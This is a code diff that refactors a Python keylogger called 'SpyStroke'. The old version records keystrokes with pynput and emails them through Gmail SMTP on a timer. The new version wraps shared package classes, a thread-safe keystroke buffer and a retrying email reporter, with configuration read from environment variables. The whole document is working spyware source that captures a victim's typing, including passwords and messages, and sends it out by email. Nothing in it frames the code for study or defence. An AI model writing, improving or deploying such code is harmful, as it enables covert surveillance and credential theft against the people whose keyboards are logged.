@@ -1,52 +1,91 @@
 #!/usr/bin/env python
+"""Email-based SpyStroke keylogger.
 
-import pynput.keyboard
+Backwards-compatible wrapper around the shared engine: keeps the original
+``Keylogger(time_interval, email, password)`` constructor signature while
+using the thread-safe buffer and retrying email reporter from the
+``spystroke`` package.
+
+Configuration can also be provided via environment variables (see
+``spystroke.config``), which is the recommended approach.
+"""
+
+from __future__ import annotations
+
+import logging
+import os
+import sys
 import threading
-import smtplib
+import time
+from typing import Optional
+
+# Make the shared package importable regardless of the working directory.
+sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+
+from spystroke.core import KeyListener  # noqa: E402
+from spystroke.email_reporter import EmailReporter  # noqa: E402
+
+logger = logging.getLogger(__name__)
+
+__all__ = ["Keylogger"]
+
 
 class Keylogger:
-    def __init__(self, time_interval, email, password):
-        self.log = "Keylogger started"
+    """Captures keystrokes and emails them on a fixed interval."""
+
+    def __init__(
+        self,
+        time_interval: int,
+        email: str,
+        password: str,
+        receiver: Optional[str] = None,
+        smtp_host: str = "smtp.gmail.com",
+        smtp_port: int = 587,
+        use_starttls: bool = True,
+    ) -> None:
         self.interval = time_interval
-        self.email = email
-        self.password = password
+        self.listener = KeyListener()
+        self.reporter = EmailReporter(
+            sender=email,
+            password=password,
+            receiver=receiver,
+            smtp_host=smtp_host,
+            smtp_port=smtp_port,
+            use_starttls=use_starttls,
+        )
+        self._stop_event = threading.Event()
 
-    def append_to_log(self, string):
-        self.log += string  # Improved string concatenation
-
-    def process_key_press(self, key):
+    def start(self) -> None:
+        """Start capturing and reporting until stopped (or Ctrl+C)."""
+        self._stop_event.clear()
+        self.listener.start()
+        logger.info("Keylogger started; reporting every %ss", self.interval)
         try:
-            current_key = str(key.char)
-        except AttributeError:
-            if key == pynput.keyboard.Key.space:
-                current_key = " "
-            else:
-                current_key = f"{str(key)} "  # Using f-string for formatting
-        self.append_to_log(current_key)
+            while not self._stop_event.is_set():
+                # Check for shutdown frequently so stop() is responsive.
+                if self._stop_event.wait(self.interval):
+                    break
+                text = self.listener.buffer.drain()
+                if text:
+                    subject = f"SpyStroke report - {time.strftime('%Y-%m-%d %H:%M:%S')}"
+                    self.reporter.send(subject=subject, body=text)
+        except KeyboardInterrupt:
+            logger.info("Interrupted, stopping")
+        finally:
+            self.listener.stop()
+            logger.info("Keylogger stopped")
 
-    def report(self):
-        self.send_mail(self.email, self.password, "\n\n " + self.log)
-        self.log = ""
-        timer = threading.Timer(self.interval, self.report)
-        timer.start()
-    
-    def send_mail(self, email, password, message):
-        try:
-            server = smtplib.SMTP("smtp.gmail.com", 587)
-            server.starttls()
-            server.login(email, password)
-            server.sendmail(email, email, message)
-            server.quit()
-        except Exception as e:
-            print(f"Failed to send email: {e}")  # Print error message
+    def stop(self) -> None:
+        """Request a graceful stop from another thread."""
+        self._stop_event.set()
 
-    def start(self):
-        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
-        with keyboard_listener:
-            self.report()
-            keyboard_listener.join()
 
 if __name__ == "__main__":
-    # This is just for testing; you might want to comment it out or remove it when deploying
-    my_keylogger = Keylogger(120, "your_email@gmail.com", "your_email_password")
-    my_keylogger.start()
+    logging.basicConfig(level=logging.INFO)
+    # Prefer environment variables; fall back to CLI-style arguments for
+    # backwards compatibility with the original script.
+    email = os.getenv("SPYSTROKE_EMAIL", "your_email@gmail.com")
+    password = os.getenv("SPYSTROKE_EMAIL_PASSWORD", "your_email_password")
+    interval = int(os.getenv("SPYSTROKE_INTERVAL", "120"))
+    keylogger = Keylogger(interval, email, password)
+    keylogger.start()
